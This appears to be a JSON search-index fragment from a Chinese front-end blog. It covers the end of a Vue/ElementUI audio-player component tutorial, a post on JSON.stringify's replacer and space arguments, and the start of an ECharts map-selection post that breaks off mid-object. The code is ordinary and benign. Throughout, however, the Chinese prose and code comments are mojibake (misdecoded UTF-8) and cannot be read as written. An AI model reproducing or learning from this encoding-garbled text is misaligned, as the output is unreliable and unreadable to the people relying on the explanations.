æ‹–åŠ¨è¿›åº¦æ¡ï¼Œæ”¹å˜å½“å‰æ—¶é—´ï¼Œindexæ˜¯è¿›åº¦æ¡æ”¹å˜æ—¶çš„å›è°ƒå‡½æ•°çš„å‚æ•°0-100ä¹‹é—´ï¼Œéœ€è¦æ¢ç®—æˆå®é™…æ—¶é—´ changeCurrentTime(index) { this.$refs.audio.currentTime = parseInt(index / 100 * this.audio.maxTime) }, // å½“éŸ³é¢‘å½“å‰æ—¶é—´æ”¹å˜åï¼Œè¿›åº¦æ¡ä¹Ÿè¦æ”¹å˜ onTimeupdate(res) { console.log(\u0026#39;timeupdate\u0026#39;) console.log(res) this.audio.currentTime = res.target.currentTime this.sliderTime = parseInt(this.audio.currentTime / this.audio.maxTime * 100) }, // è¿›åº¦æ¡æ ¼å¼åŒ–toolTip formatProcessToolTip(index = 0) { index = parseInt(this.audio.maxTime / 100 * index) return \u0026#39;è¿›åº¦æ¡: \u0026#39; + realFormatSecond(index) }, 5.5. éŸ³é¢‘éŸ³é‡æ§åˆ¶ éŸ³é¢‘çš„éŸ³é‡æ§åˆ¶å’Œè¿›åº¦æ§åˆ¶å·®ä¸å¤šï¼Œä¹Ÿæ˜¯é€šè¿‡æ‹–åŠ¨æ»‘åŠ¨æ¡ï¼Œå»ä¿®æ”¹aduio.volumeå±æ€§å€¼ï¼Œæ­¤å¤„ä¸å†å•°å—¦\n5.6. éŸ³é¢‘æ’­æ”¾é€Ÿåº¦æ§åˆ¶ éŸ³é¢‘æ’­æ”¾é€Ÿåº¦æ§åˆ¶å’Œè¿›åº¦æ§åˆ¶å·®ä¸å¤šï¼Œä¹Ÿæ˜¯ç‚¹å‡»æŒ‰é’®ï¼Œå»ä¿®æ”¹aduio.playbackRateå±æ€§å€¼ï¼Œè¯¥å±æ€§ä»£è¡¨éŸ³é‡çš„å¤§å°ï¼Œå–å€¼èŒƒå›´æ˜¯0 - 1ï¼Œç”¨æ»‘åŠ¨æ¡çš„æ—¶å€™ï¼Œä¹Ÿæ˜¯éœ€è¦æ¢ç®—ä¸€ä¸‹å€¼ï¼Œæ­¤å¤„ä¸å†å•°å—¦\n5.7. éŸ³é¢‘é™éŸ³æ§åˆ¶ é™éŸ³çš„æ§åˆ¶æ˜¯ç‚¹å‡»æŒ‰é’®ï¼Œå»ä¿®æ”¹aduio.mutedå±æ€§ï¼Œè¯¥å±æ€§æœ‰ä¸¤ä¸ªå€¼: true(é™éŸ³)ï¼Œfalse(ä¸é™éŸ³)ã€‚ æ³¨æ„ï¼Œé™éŸ³çš„æ—¶å€™ï¼ŒéŸ³é¢‘çš„è¿›åº¦æ¡è¿˜æ˜¯ä¼šç»§ç»­å¾€å‰èµ°çš„ã€‚\n5.8. éŸ³é¢‘ä¸‹è½½æ§åˆ¶ éŸ³é¢‘ä¸‹è½½æ˜¯ä¸€ä¸ªaé“¾æ¥ï¼Œè®°å¾—åŠ ä¸Šdownloadå±æ€§ï¼Œä¸ç„¶æµè§ˆå™¨ä¼šåœ¨æ–°æ ‡ç­¾æ‰“å¼€éŸ³é¢‘ï¼Œè€Œä¸æ˜¯ä¸‹è½½éŸ³é¢‘\n\u0026lt;a :href=\u0026#34;url\u0026#34; v-show=\u0026#34;!controlList.noDownload\u0026#34; target=\u0026#34;_blank\u0026#34; class=\u0026#34;download\u0026#34; download\u0026gt;ä¸‹è½½\u0026lt;/a\u0026gt; 5.9. ä¸ªæ€§åŒ–é…ç½® éŸ³é¢‘çš„ä¸ªæ€§åŒ–é…ç½®æœ‰å¾ˆå¤šï¼Œå¤§å®¶å¯ä»¥è‡ªå·±æ‰©å±•ï¼Œé€šè¿‡çˆ¶ç»„ä»¶ä¼ é€’å“åº”çš„å€¼ï¼Œå¯ä»¥åšåˆ°ä¸ªæ€§åŒ–è®¾ç½®ã€‚\ncontrolList: { // ä¸æ˜¾ç¤ºä¸‹è½½ noDownload: false, // ä¸æ˜¾ç¤ºé™éŸ³ noMuted: false, // ä¸æ˜¾ç¤ºéŸ³é‡æ¡ noVolume: false, // ä¸æ˜¾ç¤ºè¿›åº¦æ¡ noProcess: false, // åªèƒ½æ’­æ”¾ä¸€ä¸ª onlyOnePlaying: false, // ä¸è¦å¿«è¿›æŒ‰é’® noSpeed: false } setControlList () { let controlList = this.theControlList.split(\u0026#39; \u0026#39;) controlList.forEach((item) =\u0026gt; { if(this.controlList[item] !== undefined){ this.controlList[item] = true } }) }, ä¾‹å¦‚çˆ¶ç»„ä»¶è¿™æ ·\n\u0026lt;template\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;div v-for=\u0026#34;item in audios\u0026#34; :key=\u0026#34;item.url\u0026#34;\u0026gt; \u0026lt;VueAudio :theUrl=\u0026#34;item.url\u0026#34; :theControlList=\u0026#34;item.controlList\u0026#34;/\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; import VueAudio from \u0026#39;./components/VueAudio\u0026#39; export default { name: \u0026#39;app\u0026#39;, components: { VueAudio }, data () { return { audios: [ { url: \u0026#39;http://devtest.qiniudn.com/secret base~.mp3\u0026#39;, controlList: \u0026#39;onlyOnePlaying\u0026#39; }, { url: \u0026#39;http://devtest.qiniudn.com/å›ãƒ¬ï¼é›ªæœˆèŠ±.mp3\u0026#39;, controlList: \u0026#39;noDownload noMuted onlyOnePlaying\u0026#39; },{ url: \u0026#39;http://devtest.qiniudn.com/ã‚ã£ã¡ã‚…ï½ã¾é’æ˜¥!.mp3\u0026#39;, controlList: \u0026#39;noDownload noVolume noMuted onlyOnePlaying\u0026#39; },{ url: \u0026#39;http://devtest.qiniudn.com/Preparation.mp3\u0026#39;, controlList: \u0026#39;noDownload noSpeed onlyOnePlaying\u0026#39; } ] } } } \u0026lt;/script\u0026gt; \u0026lt;style\u0026gt; \u0026lt;/style\u0026gt; 5.10. ä¸€ç‚¹ç‚¹ES6è¯­æ³• å¤§å¤šæ•°æ—¶å€™ï¼Œæˆ‘ä»¬å¸Œæœ›é¡µé¢ä¸Šæ’­æ”¾ä¸€ä¸ªéŸ³é¢‘æ—¶ï¼Œå…¶ä»–éŸ³é¢‘å¯ä»¥æš‚åœã€‚ [...audios]å¯ä»¥æŠŠä¸€ä¸ªç±»æ•°ç»„è½¬åŒ–æˆæ•°ç»„ï¼Œè¿™ä¸ªæ˜¯æˆ‘å¸¸ç”¨çš„ã€‚\nonPlay (res) { console.log(res) this.audio.playing = true this.audio.loading = false if(!this.controlList.onlyOnePlaying){ return } let target = res.target let audios = document.getElementsByTagName(\u0026#39;audio\u0026#39;); // å¦‚æœè®¾ç½®äº†æ’ä»–æ€§ï¼Œå½“å‰éŸ³é¢‘æ’­æ”¾æ˜¯ï¼Œå…¶ä»–éŸ³é¢‘éƒ½è¦æš‚åœ [...audios].forEach((item) =\u0026gt; { if(item !== target){ item.pause() } }) }, 5.11. å®Œæˆåçš„æ–‡ä»¶ //filename: VueAudio.vue \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;di main-wrap\u0026#34; v-loading=\u0026#34;audio.waiting\u0026#34;\u0026gt; \u0026lt;!-- è¿™é‡Œè®¾ç½®äº†refå±æ€§åï¼Œåœ¨vueç»„ä»¶ä¸­ï¼Œå°±å¯ä»¥ç”¨this.$refs.audioæ¥è®¿é—®è¯¥domå…ƒç´  --\u0026gt; \u0026lt;audio ref=\u0026#34;audio\u0026#34; class=\u0026#34;dn\u0026#34; :src=\u0026#34;url\u0026#34; :preload=\u0026#34;audio.preload\u0026#34; @play=\u0026#34;onPlay\u0026#34; @error=\u0026#34;onError\u0026#34; @waiting=\u0026#34;onWaiting\u0026#34; @pause=\u0026#34;onPause\u0026#34; @timeupdate=\u0026#34;onTimeupdate\u0026#34; @loadedmetadata=\u0026#34;onLoadedmetadata\u0026#34; \u0026gt;\u0026lt;/audio\u0026gt; \u0026lt;div\u0026gt; \u0026lt;el-button type=\u0026#34;text\u0026#34; @click=\u0026#34;startPlayOrPause\u0026#34;\u0026gt;{{audio.playing | transPlayPause}}\u0026lt;/el-button\u0026gt; \u0026lt;el-button v-show=\u0026#34;!controlList.noSpeed\u0026#34; type=\u0026#34;text\u0026#34; @click=\u0026#34;changeSpeed\u0026#34;\u0026gt;{{audio.speed | transSpeed}}\u0026lt;/el-button\u0026gt; \u0026lt;el-tag type=\u0026#34;info\u0026#34;\u0026gt;{{ audio.currentTime | formatSecond}}\u0026lt;/el-tag\u0026gt; \u0026lt;el-slider v-show=\u0026#34;!controlList.noProcess\u0026#34; v-model=\u0026#34;sliderTime\u0026#34; :format-tooltip=\u0026#34;formatProcessToolTip\u0026#34; @change=\u0026#34;changeCurrentTime\u0026#34; class=\u0026#34;slider\u0026#34;\u0026gt;\u0026lt;/el-slider\u0026gt; \u0026lt;el-tag type=\u0026#34;info\u0026#34;\u0026gt;{{ audio.maxTime | formatSecond }}\u0026lt;/el-tag\u0026gt; \u0026lt;el-button v-show=\u0026#34;!controlList.noMuted\u0026#34; type=\u0026#34;text\u0026#34; @click=\u0026#34;startMutedOrNot\u0026#34;\u0026gt;{{audio.muted | transMutedOrNot}}\u0026lt;/el-button\u0026gt; \u0026lt;el-slider v-show=\u0026#34;!controlList.noVolume\u0026#34; v-model=\u0026#34;volume\u0026#34; :format-tooltip=\u0026#34;formatVolumeToolTip\u0026#34; @change=\u0026#34;changeVolume\u0026#34; class=\u0026#34;slider\u0026#34;\u0026gt;\u0026lt;/el-slider\u0026gt; \u0026lt;a :href=\u0026#34;url\u0026#34; v-show=\u0026#34;!controlList.noDownload\u0026#34; target=\u0026#34;_blank\u0026#34; class=\u0026#34;download\u0026#34; download\u0026gt;ä¸‹è½½\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; function realFormatSecond(second) { var secondType = typeof second if (secondType === \u0026#39;number\u0026#39; || secondType === \u0026#39;string\u0026#39;) { second = parseInt(second) var hours = Math.floor(second / 3600) second = second - hours * 3600 var mimute = Math.floor(second / 60) second = second - mimute * 60 return hours + \u0026#39;:\u0026#39; + (\u0026#39;0\u0026#39; + mimute).slice(-2) + \u0026#39;:\u0026#39; + (\u0026#39;0\u0026#39; + second).slice(-2) } else { return \u0026#39;0:00:00\u0026#39; } } export default { props: { theUrl: { type: String, required: true, }, theSpeeds: { type: Array, default () { return [1, 1.5, 2] } }, theControlList: { type: String, default: \u0026#39;\u0026#39; } }, name: \u0026#39;VueAudio\u0026#39;, data() { return { url: this.theUrl || \u0026#39;http://devtest.qiniudn.com/secret base~.mp3\u0026#39;, audio: { currentTime: 0, maxTime: 0, playing: false, muted: false, speed: 1, waiting: true, preload: \u0026#39;auto\u0026#39; }, sliderTime: 0, volume: 100, speeds: this.theSpeeds, controlList: { // ä¸æ˜¾ç¤ºä¸‹è½½ noDownload: false, // ä¸æ˜¾ç¤ºé™éŸ³ noMuted: false, // ä¸æ˜¾ç¤ºéŸ³é‡æ¡ noVolume: false, // ä¸æ˜¾ç¤ºè¿›åº¦æ¡ noProcess: false, // åªèƒ½æ’­æ”¾ä¸€ä¸ª onlyOnePlaying: false, // ä¸è¦å¿«è¿›æŒ‰é’® noSpeed: false } } }, methods: { setControlList () { let controlList = this.theControlList.split(\u0026#39; \u0026#39;) controlList.forEach((item) =\u0026gt; { if(this.controlList[item] !== undefined){ this.controlList[item] = true } }) }, changeSpeed() { let index = this.speeds.indexOf(this.audio.speed) + 1 this.audio.speed = this.speeds[index % this.speeds.length] this.$refs.audio.playbackRate = this.audio.speed }, startMutedOrNot() { this.$refs.audio.muted = !this.$refs.audio.muted this.audio.muted = this.$refs.audio.muted }, // éŸ³é‡æ¡toolTip formatVolumeToolTip(index) { return \u0026#39;éŸ³é‡æ¡: \u0026#39; + index }, // è¿›åº¦æ¡toolTip formatProcessToolTip(index = 0) { index = parseInt(this.audio.maxTime / 100 * index) return \u0026#39;è¿›åº¦æ¡: \u0026#39; + realFormatSecond(index) }, // éŸ³é‡æ”¹å˜ changeVolume(index = 0) { this.$refs.audio.volume = index / 100 this.volume = index }, // æ’­æ”¾è·³è½¬ changeCurrentTime(index) { this.$refs.audio.currentTime = parseInt(index / 100 * this.audio.maxTime) }, startPlayOrPause() { return this.audio.playing ? this.pausePlay() : this.startPlay() }, // å¼€å§‹æ’­æ”¾ startPlay() { this.$refs.audio.play() }, // æš‚åœ pausePlay() { this.$refs.audio.pause() }, // å½“éŸ³é¢‘æš‚åœ onPause () { this.audio.playing = false }, // å½“å‘ç”Ÿé”™è¯¯, å°±å‡ºç°loadingçŠ¶æ€ onError () { this.audio.waiting = true }, // å½“éŸ³é¢‘å¼€å§‹ç­‰å¾… onWaiting (res) { console.log(res) }, // å½“éŸ³é¢‘å¼€å§‹æ’­æ”¾ onPlay (res) { console.log(res) this.audio.playing = true this.audio.loading = false if(!this.controlList.onlyOnePlaying){ return } let target = res.target let audios = document.getElementsByTagName(\u0026#39;audio\u0026#39;); [...audios].forEach((item) =\u0026gt; { if(item !== target){ item.pause() } }) }, // å½“timeupdateäº‹ä»¶å¤§æ¦‚æ¯ç§’ä¸€æ¬¡ï¼Œç”¨æ¥æ›´æ–°éŸ³é¢‘æµçš„å½“å‰æ’­æ”¾æ—¶é—´ onTimeupdate(res) { // console.log(\u0026#39;timeupdate\u0026#39;) // console.log(res) this.audio.currentTime = res.target.currentTime this.sliderTime = parseInt(this.audio.currentTime / this.audio.maxTime * 100) }, // å½“åŠ è½½è¯­éŸ³æµå…ƒæ•°æ®å®Œæˆåï¼Œä¼šè§¦å‘è¯¥äº‹ä»¶çš„å›è°ƒå‡½æ•° // è¯­éŸ³å…ƒæ•°æ®ä¸»è¦æ˜¯è¯­éŸ³çš„é•¿åº¦ä¹‹ç±»çš„æ•°æ® onLoadedmetadata(res) { console.log(\u0026#39;loadedmetadata\u0026#39;) console.log(res) this.audio.waiting = false this.audio.maxTime = parseInt(res.target.duration) } }, filters: { formatSecond(second = 0) { return realFormatSecond(second) }, transPlayPause(value) { return value ? \u0026#39;æš‚åœ\u0026#39; : \u0026#39;æ’­æ”¾\u0026#39; }, transMutedOrNot(value) { return value ? \u0026#39;æ”¾éŸ³\u0026#39; : \u0026#39;é™éŸ³\u0026#39; }, transSpeed(value) { return \u0026#39;å¿«è¿›: x\u0026#39; + value } }, created() { this.setControlList() } } \u0026lt;/script\u0026gt; \u0026lt;!-- Add \u0026#34;scoped\u0026#34; attribute to limit CSS to this component only --\u0026gt; \u0026lt;style scoped\u0026gt; .main-wrap{ padding: 10px 15px; } .slider { display: inline-block; width: 100px; position: relative; top: 14px; margin-left: 15px; } .di { display: inline-block; } .download { color: #409EFF; margin-left: 15px; } .dn{ display: none; } \u0026lt;/style\u0026gt; 6. æ„Ÿè°¢ å¦‚æœä½ éœ€è¦ä¸€ä¸ªå°å‹çš„vueéŸ³ä¹æ’­æ”¾å™¨ï¼Œä½ å¯ä»¥è¯•è¯•vue-aplayer, è¯¥æ’­æ”¾å™¨ä¸ä»…ä»…æ”¯æŒvueç»„ä»¶ï¼ŒéVueçš„ä¹Ÿæ”¯æŒï¼Œä½ å¯ä»¥çœ‹çœ‹ä»–ä»¬çš„demo\n","permalink":"https://wdd.js.org/posts/2018/02/vue-elementui-audio-component/","summary":"1. ç®€ä»‹ 1.1. ç›¸å…³æŠ€æœ¯ Vue Vue-cli ElementUI yarn (ä¹‹å‰æˆ‘ç”¨npm, å¹¶ä½¿ç”¨cnpmçš„æºï¼Œä½†æ˜¯ç”¨äº†yarnä¹‹åï¼Œæˆ‘å‘ç°å®ƒæ¯”cnpmçš„é€Ÿåº¦è¿˜å¿«ï¼ŒåŠŸèƒ½æ›´å¥½ï¼Œæˆ‘å°±æ¯«ä¸çŠ¹è±«é€‰æ‹©yarnäº†) Audioç›¸å…³APIå’Œäº‹ä»¶ 1.2. ä»æœ¬æ•™ç¨‹ä½ ä¼šå­¦åˆ°ä»€ä¹ˆï¼Ÿ Vueå•æ–‡ä»¶ç»„ä»¶å¼€å‘çŸ¥è¯† Element UIåŸºæœ¬ç”¨æ³• AudioåŸç”ŸAPIåŠAudioç›¸å…³äº‹ä»¶ éŸ³é¢‘æ’­æ”¾å™¨çš„åŸºæœ¬åŸç† éŸ³é¢‘çš„æ’­æ”¾æš‚åœæ§åˆ¶ æ›´æ–°éŸ³é¢‘æ˜¾ç¤ºæ—¶é—´ éŸ³é¢‘è¿›åº¦æ¡æ§åˆ¶ä¸è·³è½¬ éŸ³é¢‘éŸ³é‡æ§åˆ¶ éŸ³é¢‘æ’­æ”¾é€Ÿåº¦æ§åˆ¶ éŸ³é¢‘é™éŸ³æ§åˆ¶ éŸ³é¢‘ä¸‹è½½æ§åˆ¶ ä¸ªæ€§åŒ–é…ç½®ä¸æ’ä»–æ€§æ’­æ”¾ ä¸€ç‚¹ç‚¹ES6è¯­æ³• 2. å­¦å‰å‡†å¤‡ åŸºæœ¬ä¸Šä¸éœ€è¦ä»€ä¹ˆå‡†å¤‡ï¼Œä½†æ˜¯å¦‚æœä½ èƒ½å…ˆçœ‹ä¸€ä¸‹Aduioç›¸å…³APIå’Œäº‹ä»¶å°†ä¼šæ›´å¥½\nAudio: å¦‚æœä½ æ„¿æ„ä¸€å±‚ä¸€å±‚å‰¥å¼€æˆ‘çš„å¿ƒ ä½¿ç”¨ HTML5 éŸ³é¢‘å’Œè§†é¢‘ 3. åœ¨çº¿demon æ²¡æœ‰åœ¨çº¿demoçš„æ•™ç¨‹éƒ½æ˜¯è€æµæ°“\næŸ¥çœ‹åœ¨çº¿demon é¡¹ç›®åœ°å€ 4. å¼€å§‹ç¼–ç  5. é¡¹ç›®åˆå§‹åŒ– âœ test vue init webpack element-audio A newer version of vue-cli is available. latest: 2.9.2 installed: 2.9.1 ? Project name element-audio ? Project description A Vue.js project ?","title":"Vue+ElementUI æ‰‹æŠŠæ‰‹æ•™ä½ åšä¸€ä¸ªaudioç»„ä»¶"},{"content":"1. è¯­æ³• JSON.stringify(value[, replacer[, space]]) ä¸€èˆ¬ç”¨æ³•ï¼š\nvar user = {name: \u0026#39;andy\u0026#39;, isDead: false, age: 11, addr: \u0026#39;shanghai\u0026#39;}; JSON.stringify(user); \u0026#34;{\u0026#34;name\u0026#34;:\u0026#34;andy\u0026#34;,\u0026#34;isDead\u0026#34;:false,\u0026#34;age\u0026#34;:11,\u0026#34;addr\u0026#34;:\u0026#34;shanghai\u0026#34;}\u0026#34; 2. æ‰©å±•ç”¨æ³• 2.1. replacer replacerå¯ä»¥æ˜¯å‡½æ•°æˆ–è€…æ˜¯æ•°ç»„ã€‚\nåŠŸèƒ½1: æ”¹å˜å±æ€§å€¼ å°†isDeadå±æ€§çš„å€¼ç¿»è¯‘æˆ0æˆ–1ï¼Œ0å¯¹åº”false,1å¯¹åº”true\nvar user = {name: \u0026#39;andy\u0026#39;, isDead: false, age: 11, addr: \u0026#39;shanghai\u0026#39;}; JSON.stringify(user, function(key, value){ if(key === \u0026#39;isDead\u0026#39;){ return value === true ? 1 : 0; } return value; }); \u0026#34;{\u0026#34;name\u0026#34;:\u0026#34;andy\u0026#34;,\u0026#34;isDead\u0026#34;:0,\u0026#34;age\u0026#34;:11,\u0026#34;addr\u0026#34;:\u0026#34;shanghai\u0026#34;}\u0026#34; åŠŸèƒ½2ï¼šåˆ é™¤æŸä¸ªå±æ€§ å°†isDeadå±æ€§åˆ é™¤ï¼Œå¦‚æœreplacerçš„è¿”å›å€¼æ˜¯undefined,é‚£ä¹ˆè¯¥å±æ€§ä¼šè¢«åˆ é™¤ã€‚\nvar user = {name: \u0026#39;andy\u0026#39;, isDead: false, age: 11, addr: \u0026#39;shanghai\u0026#39;}; JSON.stringify(user, function(key, value){ if(key === \u0026#39;isDead\u0026#39;){ return undefined; } return value; }); \u0026#34;{\u0026#34;name\u0026#34;:\u0026#34;andy\u0026#34;,\u0026#34;age\u0026#34;:11,\u0026#34;addr\u0026#34;:\u0026#34;shanghai\u0026#34;}\u0026#34; åŠŸèƒ½3: é€šè¿‡æ•°ç»„è¿‡æ»¤æŸäº›å±æ€§ åªéœ€è¦nameå±æ€§å’Œaddrå±æ€§ï¼Œå…¶ä»–ä¸è¦ã€‚\nvar user = {name: \u0026#39;andy\u0026#39;, isDead: false, age: 11, addr: \u0026#39;shanghai\u0026#39;}; JSON.stringify(user, [\u0026#39;name\u0026#39;, \u0026#39;addr\u0026#39;]); \u0026#34;{\u0026#34;name\u0026#34;:\u0026#34;andy\u0026#34;,\u0026#34;addr\u0026#34;:\u0026#34;shanghai\u0026#34;}\u0026#34; 2.2. space spaceå¯ä»¥æ˜¯æ•°å­—æˆ–è€…æ˜¯å­—ç¬¦ä¸², å¦‚æœæ˜¯æ•°å­—åˆ™è¡¨ç¤ºå±æ€§åå‰åŠ ä¸Šç©ºæ ¼ç¬¦å·çš„æ•°é‡ï¼Œå¦‚æœæ˜¯å­—ç¬¦ä¸²ï¼Œåˆ™ç›´æ¥åœ¨å±æ€§åå‰åŠ ä¸Šè¯¥å­—ç¬¦ä¸²ã€‚\nåŠŸèƒ½1: ç»™è¾“å‡ºå±æ€§å‰åŠ ä¸Šnä¸ªç©ºæ ¼\nvar user = {name: \u0026#39;andy\u0026#39;, isDead: false, age: 11, addr: \u0026#39;shanghai\u0026#39;}; JSON.stringify(user, null, 4); \u0026#34;{ \u0026#34;name\u0026#34;: \u0026#34;andy\u0026#34;, \u0026#34;isDead\u0026#34;: false, \u0026#34;age\u0026#34;: 11, \u0026#34;addr\u0026#34;: \u0026#34;shanghai\u0026#34; }\u0026#34; åŠŸèƒ½2: tabæ ¼å¼åŒ–è¾“å‡º\nvar user = {name: \u0026#39;andy\u0026#39;, isDead: false, age: 11, addr: \u0026#39;shanghai\u0026#39;}; JSON.stringify(user, null, \u0026#39;\\t\u0026#39;); \u0026#34;{ \u0026#34;name\u0026#34;: \u0026#34;andy\u0026#34;, \u0026#34;isDead\u0026#34;: false, \u0026#34;age\u0026#34;: 11, \u0026#34;addr\u0026#34;: \u0026#34;shanghai\u0026#34; }\u0026#34; åŠŸèƒ½3ï¼š æç¬‘\nJSON.stringify(user, null, \u0026#39;good\u0026#39;); \u0026#34;{ good\u0026#34;name\u0026#34;: \u0026#34;andy\u0026#34;, good\u0026#34;isDead\u0026#34;: false, good\u0026#34;age\u0026#34;: 11, good\u0026#34;addr\u0026#34;: \u0026#34;shanghai\u0026#34; }\u0026#34; 2.3. æ·±æ‹·è´ var user = {name: \u0026#39;andy\u0026#39;, isDead: false, age: 11, addr: \u0026#39;shanghai\u0026#39;}; var temp = JSON.stringify(user); var user2 = JSON.parse(temp); 3. å…¶ä»– JSON.parse() å…¶å®ä¹Ÿæ˜¯æ”¯æŒç¬¬äºŒä¸ªå‚æ•°çš„ã€‚åŠŸèƒ½ç±»ä¼¼äºJSON.stringifyçš„ç¬¬äºŒä¸ªå‚æ•°çš„åŠŸèƒ½ã€‚\n4. å‚è€ƒ MDN JSON.stringify() ","permalink":"https://wdd.js.org/posts/2018/02/json-stringify-powerful/","summary":"1. è¯­æ³• JSON.stringify(value[, replacer[, space]]) ä¸€èˆ¬ç”¨æ³•ï¼š\nvar user = {name: \u0026#39;andy\u0026#39;, isDead: false, age: 11, addr: \u0026#39;shanghai\u0026#39;}; JSON.stringify(user); \u0026#34;{\u0026#34;name\u0026#34;:\u0026#34;andy\u0026#34;,\u0026#34;isDead\u0026#34;:false,\u0026#34;age\u0026#34;:11,\u0026#34;addr\u0026#34;:\u0026#34;shanghai\u0026#34;}\u0026#34; 2. æ‰©å±•ç”¨æ³• 2.1. replacer replacerå¯ä»¥æ˜¯å‡½æ•°æˆ–è€…æ˜¯æ•°ç»„ã€‚\nåŠŸèƒ½1: æ”¹å˜å±æ€§å€¼ å°†isDeadå±æ€§çš„å€¼ç¿»è¯‘æˆ0æˆ–1ï¼Œ0å¯¹åº”false,1å¯¹åº”true\nvar user = {name: \u0026#39;andy\u0026#39;, isDead: false, age: 11, addr: \u0026#39;shanghai\u0026#39;}; JSON.stringify(user, function(key, value){ if(key === \u0026#39;isDead\u0026#39;){ return value === true ? 1 : 0; } return value; }); \u0026#34;{\u0026#34;name\u0026#34;:\u0026#34;andy\u0026#34;,\u0026#34;isDead\u0026#34;:0,\u0026#34;age\u0026#34;:11,\u0026#34;addr\u0026#34;:\u0026#34;shanghai\u0026#34;}\u0026#34; åŠŸèƒ½2ï¼šåˆ é™¤æŸä¸ªå±æ€§ å°†isDeadå±æ€§åˆ é™¤ï¼Œå¦‚æœreplacerçš„è¿”å›å€¼æ˜¯undefined,é‚£ä¹ˆè¯¥å±æ€§ä¼šè¢«åˆ é™¤ã€‚\nvar user = {name: \u0026#39;andy\u0026#39;, isDead: false, age: 11, addr: \u0026#39;shanghai\u0026#39;}; JSON.","title":"ä½ ä¸çŸ¥é“çš„JSON.stringify()å¦™ç”¨"},{"content":"1. å°æ —å­ æœ€æ—©æˆ‘æ˜¯æƒ³é€šè¿‡dispatchActionæ–¹æ³•å»æ”¹å˜é€‰ä¸­çš„çœä»½ï¼Œä½†æ˜¯æ²¡æœ‰èµ·ä½œç”¨ï¼Œå¦‚æœä½ çŸ¥é“è¿™ä¸ªæ–¹æ³•æ€ä¹ˆå®ç°ï¼Œéº»çƒ¦ä½ å¯ä»¥å‘Šè¯‰æˆ‘ã€‚ æˆ‘å®ç°çš„æ–¹æ³•æ˜¯å¦å¤–ä¸€ç§ã€‚\ndispatchAction({ type: \u0026#39;geoSelect\u0026#39;, // å¯é€‰ï¼Œç³»åˆ— indexï¼Œå¯ä»¥æ˜¯ä¸€ä¸ªæ•°ç»„æŒ‡å®šå¤šä¸ªç³»åˆ— seriesIndex?: number|Array, // å¯é€‰ï¼Œç³»åˆ—åç§°ï¼Œå¯ä»¥æ˜¯ä¸€ä¸ªæ•°ç»„æŒ‡å®šå¤šä¸ªç³»åˆ— seriesName?: string|Array, // æ•°æ®çš„ indexï¼Œå¦‚æœä¸æŒ‡å®šä¹Ÿå¯ä»¥é€šè¿‡ name å±æ€§æ ¹æ®åç§°æŒ‡å®šæ•°æ® dataIndex?: number, // å¯é€‰ï¼Œæ•°æ®åç§°ï¼Œåœ¨æœ‰ dataIndex çš„æ—¶å€™å¿½ç•¥ name?: string }) åæ¥æˆ‘æ”¹å˜äº†ä¸€ä¸ªæ–¹æ³•ã€‚è¿™ä¸ªæ–¹æ³•çš„æ ¸å¿ƒæ€è·¯æ˜¯å®šæ—¶è·å–å›¾æ ‡çš„é…ç½®ï¼Œç„¶åæ›´æ–°é…ç½®ï¼Œæœ€ååœ¨è®¾ç½®é…ç½®ã€‚\nvar myChart = echarts.init(document.getElementById(\u0026#39;china-map\u0026#39;)); var COLORS = [\u0026#34;#070093\u0026#34;, \u0026#34;#1c3fbf\u0026#34;, \u0026#34;#1482e5\u0026#34;, \u0026#34;#70b4eb\u0026#34;, \u0026#34;#b4e0f3\u0026#34;, \u0026#34;#ffffff\u0026#34;]; // æŒ‡å®šå›¾è¡¨çš„é…ç½®é¡¹å’Œæ•°æ® var option = { tooltip: { trigger: \u0026#39;item\u0026#39;, formatter: \u0026#39;{b}\u0026#39; }, series: [ { name: \u0026#39;ä¸­å›½\u0026#39;, type: \u0026#39;map\u0026#39;, mapType: \u0026#39;china\u0026#39;, selectedMode : \u0026#39;single\u0026#39;, label: { normal: { show: true }, emphasis: { show: true } }, data:[ // é»˜è®¤é«˜äº®å®‰å¾½çœ {name:\u0026#39;å®‰å¾½\u0026#39;, selected:true} ], itemStyle: { normal: { areaColor: \u0026#39;rgba(255,255,255,0.5)\u0026#39;, color: \u0026#39;#000000\u0026#39;, shadowBlur: 200, shadowColor: \u0026#39;rgba(0, 0, 0, 0.5)\u0026#39; }, emphasis:{ areaColor: \u0026#39;#3be2fb\u0026#39;, color: \u0026#39;#000000\u0026#39;, shadowBlur: 200, shadowColor: \u0026#39;rgba(0, 0, 0, 0.5)\u0026#39; } } } ] }; // ä½¿ç”¨åˆšæŒ‡å®šçš„é…ç½®é¡¹å’Œæ•°æ®æ˜¾ç¤ºå›¾è¡¨ã€‚ myChart.setOption(option); myChart.on(\u0026#39;click\u0026#39;, function(params) { console.log(params); }); setInterval(function(){ var op = myChart.getOption(); var data = op.series[0].data; var length = data.length; data.some(function(item, index){ if(item.selected){ item.selected = false; var next = (index + 1)%length; data[next].selected = true; return true; } }); myChart.setOption(op); }, 3000); 2. åç»­è¡¥å…… æˆ‘ä»è¿™é‡Œå‘ç°ï¼šhttps://github.com/ecomfe/echarts/issues/3282ï¼Œé€‰ä¸­åœ°å›¾çš„å†™æ³•æ˜¯è¿™æ ·çš„ï¼Œè€Œè¯•äº†ä¸€ä¸‹æœç„¶å¯ä»¥ã€‚ä¸»è¦æ˜¯typeè¦æ˜¯mapSelect,è€Œä¸æ˜¯geoSelect\nmyChart.dispatchAction({ type: \u0026#39;mapSelect\u0026#39;, // å¯é€‰ï¼Œç³»åˆ— indexï¼Œå¯ä»¥æ˜¯ä¸€ä¸ªæ•°ç»„æŒ‡å®šå¤šä¸ªç³»åˆ— // seriesIndex: 0, // å¯é€‰ï¼Œç³»åˆ—åç§°ï¼Œå¯ä»¥æ˜¯ä¸€ä¸ªæ•°ç»„æŒ‡å®šå¤šä¸ªç³»åˆ— // seriesName: string|Array, // æ•°æ®çš„ indexï¼Œå¦‚æœä¸æŒ‡å®šä¹Ÿå¯ä»¥é€šè¿‡ name å±æ€§æ ¹æ®åç§°æŒ‡å®šæ•°æ® // dataIndex: number, // å¯é€‰ï¼Œæ•°æ®åç§°ï¼Œåœ¨æœ‰ dataIndex çš„æ—¶å€™å¿½ç•¥ name: 